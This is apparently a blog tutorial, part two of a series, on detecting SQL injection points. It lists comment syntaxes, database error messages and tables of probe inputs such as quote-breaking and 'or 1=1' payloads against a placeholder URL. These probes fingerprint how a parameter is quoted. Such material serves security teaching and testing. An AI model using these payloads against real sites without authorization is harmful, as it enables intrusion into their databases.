---
coverImage: "network_for_hackers.jpg"
title: Basic of SQL for SQL Injection part 2
publishDate: 2017-02-25
updateDate: 2014-05-05
author: Abhinav Kumar
image:   '~/assets/images/SQli.jpg'
excerpt: Learn SQL Injection.
draft: false
category: WebAppSec
---

Welcome to the second part of basics of SQL for SQL injection. We took this url `http://fakesite.com/report.php?id=23` as an example and then assumed some basic queries by looking at the URL. Our queries were:

```sql
select \* from table\_name where id=23
select \* from table\_name where id='23'
select \* from table\_name where id="23"
select \* from table\_name where id=(23)
select \* from table\_name where id=('23')
select \* from table\_name where id=("23")
```

You may also encounter your input under the columns or group/order by statements but they are not common, so we will discuss them later on. Now lets continue to next step how to test with different input and know which of the above query are we dealing with.

before we start we must know different types of comments used in SQLi.
```sql
| Comment |  | Name |
| --- | --- | --- |
| \-- | : | MySQL Linux Style |
| \--+ | : | MySQL Windows Style |
| # | : | Hash (URL encode while use) |
| \--+- | : | SQL Comment |
| ;%00 | : | Null Byte |
| \` | : | Backtick |
```

So now lets start with out next phase. All what we need to do is input different injections and see how Application acts on it.

_**Information**_ Remember whenever the input is enclosed with single quotes only single quote with input will create error. When input is enlcosed by double quotes a double qoute with input will give error. When Input is not enlcosed with anything single quote and double quote both will give error.

First of all we can try our input with some injections to see if we get any error. Error may always not be real SQL error it may be some times generic error or change in output of the application. All you have to do it recognise it.

**MySQL Error Style**:
```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```
**MSSQL ASPX Error**:
```sql
Server Error in '/' Application
```
**MSAccess (Apache PHP)**:
```sql
Fatal error: Uncaught exception 'com\_exception' with message Source: Microsoft JET Database Engine
```
**MSAccesss (IIS ASP)**:
```sql
Microsoft JET Database Engine error '80040e14'
```
**Oracle Error**:
```sql
ORA-00933: SQL command not properly ended
```
**ODBC Error**:
```sql
Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)
```
**PostgreSQL Error**:
```sql
PSQLException: ERROR: unterminated quoted string at or near "'" Position: 1
or
Query failed: ERROR: syntax error at or near
"'" at character 56 in /www/site/test.php on line 121.
```
**MS SQL Server: Error**:
```sql
Microsoft SQL Native Client error %u201880040e14%u2019
Unclosed quotation mark after the character string
```
Now i will show you different tests to create errors and confirm which query is working inside the Application while using the same example `http://fakesite.com/report.php?id=23` url, You can perform these tests and check the reactions of the application:

```sql
select \* from table\_name where id=23

| Input |  | Reaction if its Intiger Based Injection |
| --- | --- | --- |
| 23' | : | It should cause error or no output |
| " | : | Should cause error or no output |
| 23 or 1=1 | : | Any Output should come but may be different output |
| 23 and 1=1 | : | Same output should come |
| 23 and false | : | No output |
| 23 and true | : | Same Output |
| 23--+ | : | Same output. I used --+ to comment, later i ll show how to know which one to use |
| 23 and true--+ | : | Same output |
```

If the Web application reacts same as shown above then you can make sure that the injection is intiger type. Now lets test for single quote enclosed input query.

```sql
select \* from table\_name where id='23'

| Input |  | Reaction if its Single Qoute Based Injection |
| --- | --- | --- |
| 23' | : | It should cause error or no output |
| 23" | : | No error Same output |
| 23' or '1'='1 | : | Any Output should come but may be different output |
| 23' and '1'='1 | : | Same output should come |
| 23' and false--+ | : | No output |
| 23' and true--+ | : | Same Output |
```

If the Web application reacts same as shown above then you can make sure that the injection is single quote type. Now lets test for double quote enclosed input query.

```sql
select \* from table\_name where id="23"

 

| Input |  | Reaction if its Double Qoute Based Injection |
| --- | --- | --- |
| 23' | : | No error Same output |
| 23" | : | \>It should cause error or no output |
| 23" or "1"="1 | : | Any Output should come but may be different output |
| 23" and "1"="1 | : | Same output should come |
| 23" and false--+ | : | No output |
| 23" and true--+ | : | Same Output |
```

If the Web application reacts same as shown above then you can make sure that the injection is Double quote type. Now lets test for bracket enclosed initger based input query.

```sql
select \* from table\_name where id=(23)

 

| Input |  | Reaction if its Intiger Based Bracket enclosed Injection |
| --- | --- | --- |
| 23' | : | It should cause error or no output |
| " | : | Should cause error or no output |
| 23 or 1=1 | : | Output should come but may be different output |
| 23 and 1=1 | : | Output should come but may be different output |
| 23 and false | : | No output |
| 23 and true | : | Same Output |
| 23--+ | : | Error or No output. Here you can understand that any Bracket is used |
| 23)--+ | : | Same output |
| 23) and false--+ | : | No output |
| 23) and true--+ | : | Same output |
```
If the Web application reacts same as shown above then you can make sure that the injection is Intiger type with bracket Query. Now lets test for bracket enclosed Single Quote based input query.

```sql
select \* from table\_name where id=('23')

 

| Input |  | Reaction if its bracket enclosed Single Quote based Injection |
| --- | --- | --- |
| 23' | : | It should cause error or no output |
| 23" | : | No error Same output |
| 23' or '1'='1 | : | Any Output should come but may be different output |
| 23' and '1'='1 | : | Any Output should come but may be different output |
| 23' and false--+ | : | No output or error |
| 23' and true--+ | : | No output or error |
| 23') and False--+ | : | No output |
| 23') and true--+ | : | Same Output |
| 23') or true--+ | : | Output will come but may be different |
```

If the Web application reacts same as shown above then you can make sure that the injection is bracket enclosed Single Quote based input query. Now lets test for bracket enclosed double Quote based input query.

```sql
select \* from table\_name where id=("23")

 

| Input |  | Reaction if its bracket enclosed Double Quote based Injection |
| --- | --- | --- |
| 23' | : | No error Same output |
| 23" | : | Error or No output |
| 23" or "1"="1 | : | Any Output should come but may be different output |
| 23" and "1"="1 | : | Any Output should come but may be different output |
| 23" and false--+ | : | No output or error |
| 23" and true--+ | : | No output or error |
| 23") and False--+ | : | No output |
| 23") and true--+ | : | Same Output |
| 23") or true--+ | : | Output will come but may be different |
```

If the Web application reacts same as shown above then you can make sure that the injection is bracket enclosed double Quote based input query.

So here we just learn to check which query is working inside the application, in the next tutorial we will learn two things how to use the right comment operator and how and why to find the number of columns.
